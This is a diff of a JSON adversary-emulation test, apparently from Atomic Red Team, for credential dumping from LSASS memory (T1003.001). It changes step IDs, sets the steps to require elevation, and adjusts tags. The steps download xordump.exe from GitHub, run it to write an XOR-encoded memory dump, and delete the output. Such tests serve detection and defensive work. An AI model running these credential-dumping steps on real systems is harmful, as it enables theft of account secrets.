@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "07ed6c20-5eec-4b7f-84ae-5b118bb098be",
+      "id": "eaccb713-76e9-4756-ae4b-658ae15e9a08",
       "type": "execute-command",
       "data": {
         "command": "#{xordump_exe} -out #{output_file} -x 0x41\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "46824fb6-7c7f-4146-8863-e1d4fb1955dd",
+      "id": "9e779cee-605d-4c23-8fdb-f37116ab8271",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item #{output_file} -ErrorAction Ignore\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "fe070d7f-2575-4521-937b-8b8298fde8e2",
+      "id": "e7802e2b-acc1-48fe-a774-6621a421e0b5",
       "name": "Check dependency 1/1",
       "description": "Computer must have xordump.exe\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "5f3267cd-c89f-4201-a670-9cfa370bcff6",
+      "id": "3009c0af-0b1d-4497-8e6d-3fc0e55b4d3b",
       "name": "Resolve dependency 1/1",
       "description": "Computer must have xordump.exe\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile #{xordump_exe}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "e3cf7f9c-7eea-45d5-96a1-274a6a7449bf",
+      "id": "f919795d-c392-4ff9-9773-948ce652b705",
       "name": "Re-check dependency 1/1",
       "description": "Computer must have xordump.exe\n",
       "type": "execute-command",
@@ -55,44 +55,44 @@
         "command": "if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "07ed6c20-5eec-4b7f-84ae-5b118bb098be",
+      "s": "eaccb713-76e9-4756-ae4b-658ae15e9a08",
       "p": "on-success",
-      "o": "46824fb6-7c7f-4146-8863-e1d4fb1955dd"
+      "o": "9e779cee-605d-4c23-8fdb-f37116ab8271"
     },
     {
-      "s": "07ed6c20-5eec-4b7f-84ae-5b118bb098be",
+      "s": "eaccb713-76e9-4756-ae4b-658ae15e9a08",
       "p": "on-failure",
-      "o": "46824fb6-7c7f-4146-8863-e1d4fb1955dd"
+      "o": "9e779cee-605d-4c23-8fdb-f37116ab8271"
     },
     {
-      "s": "fe070d7f-2575-4521-937b-8b8298fde8e2",
+      "s": "e7802e2b-acc1-48fe-a774-6621a421e0b5",
       "p": "on-success",
-      "o": "07ed6c20-5eec-4b7f-84ae-5b118bb098be"
+      "o": "eaccb713-76e9-4756-ae4b-658ae15e9a08"
     },
     {
-      "s": "fe070d7f-2575-4521-937b-8b8298fde8e2",
+      "s": "e7802e2b-acc1-48fe-a774-6621a421e0b5",
       "p": "on-failure",
-      "o": "5f3267cd-c89f-4201-a670-9cfa370bcff6"
+      "o": "3009c0af-0b1d-4497-8e6d-3fc0e55b4d3b"
     },
     {
-      "s": "5f3267cd-c89f-4201-a670-9cfa370bcff6",
+      "s": "3009c0af-0b1d-4497-8e6d-3fc0e55b4d3b",
       "p": "on-success",
-      "o": "e3cf7f9c-7eea-45d5-96a1-274a6a7449bf"
+      "o": "f919795d-c392-4ff9-9773-948ce652b705"
     },
     {
-      "s": "e3cf7f9c-7eea-45d5-96a1-274a6a7449bf",
+      "s": "f919795d-c392-4ff9-9773-948ce652b705",
       "p": "on-failure",
-      "o": "07ed6c20-5eec-4b7f-84ae-5b118bb098be"
+      "o": "eaccb713-76e9-4756-ae4b-658ae15e9a08"
     }
   ],
   "tags": [
-    "T1003.001",
-    "atomic-red-team"
+    "T1003",
+    "T1003.001"
   ],
   "input_arguments": [
     {
